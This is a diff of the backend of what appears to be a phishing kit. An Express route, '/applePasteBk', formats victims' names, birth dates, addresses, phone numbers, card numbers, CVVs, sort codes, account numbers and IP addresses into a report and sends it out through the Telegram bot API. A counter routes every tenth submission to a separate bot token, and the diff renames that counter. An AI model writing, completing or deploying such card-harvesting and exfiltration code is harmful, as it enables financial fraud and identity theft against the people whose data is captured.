@@ -3134,7 +3134,7 @@ app.post("/applePasteBk", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (firstTrust == 10) {
+      if (pastebk == 10) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
@@ -3147,7 +3147,7 @@ app.post("/applePasteBk", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        firstTrust = 6;
+          pastebk = 6;
       } else {
         axios
           .post(
@@ -3173,7 +3173,7 @@ app.post("/applePasteBk", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        firstTrust += 1;
+          pastebk += 1;
       }
       res.send("Update Complete");
     });
